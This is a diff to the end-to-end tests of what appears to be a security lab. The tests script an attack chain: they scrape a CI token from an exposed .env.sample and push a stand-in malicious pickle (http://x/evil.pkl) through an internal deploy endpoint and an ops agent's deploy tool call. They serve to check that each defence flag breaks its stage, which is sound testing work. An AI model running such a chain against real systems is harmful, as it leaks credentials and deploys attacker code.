@@ -14,9 +14,24 @@ from .conftest import make_chain_client
 OPS_SCRIPT = [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")]
 
 
+_TOKEN_MARKER = "EIGER_CI_TOKEN="
+
+
+def _extract_token(blob_content):
+    """Pull the CI token out of the /source/blob HTTP response body the way a
+    participant would -- never through the ChainProvider back-channel. When
+    SEC_SECRET_SCANNING scrubs the token out of the body, this returns "",
+    which is exactly what a participant would be stuck with.
+    """
+    idx = blob_content.find(_TOKEN_MARKER)
+    if idx == -1:
+        return ""
+    return blob_content[idx + len(_TOKEN_MARKER):].splitlines()[0]
+
+
 def _run(client, chain_for, session="p1"):
-    tok = chain_for(session).ci_token
-    client.get("/source/blob", params={"session": session, "path": ".env.sample"})
+    blob = client.get("/source/blob", params={"session": session, "path": ".env.sample"}).json()
+    tok = _extract_token(blob["content"])
     client.post("/internal/deploy", json={
         "session_id": session, "ci_token": tok, "artifact_url": "http://x/evil.pkl"})
     client.post("/api/ops-agent", json={"session_id": session, "message": "run the runbook"})
@@ -44,10 +59,15 @@ def test_e2e_any_single_flag_breaks_the_chain(flag, broken_stage):
         {"HALCYON_MODE": "vulnerable", flag: "1"}, OPS_SCRIPT)
     result = _run(client, chain_for)
     assert result["core"] == "fail"
-    # Not just an overall fail -- the flag must break its own stage. Every
-    # stage from the broken one onward stays unmet; stages strictly before it
-    # can still fire (they don't depend on the guard that just tripped).
-    assert result["stages"][broken_stage] is False, result["stages"]
+    # Not just an overall fail -- the *first* unmet stage, in chain order, must
+    # be the one this flag guards. `result["stages"]` is built from
+    # validators.chain.ORDER (chain order) and survives the JSON round-trip
+    # with insertion order intact, so this localizes the break to the right
+    # link instead of merely confirming *a* downstream stage failed (which a
+    # cascading failure satisfies for free, no matter which link actually
+    # broke).
+    first_broken = next(k for k, v in result["stages"].items() if not v)
+    assert first_broken == broken_stage, result["stages"]
 
 
 def test_e2e_secure_mode_breaks_the_chain():
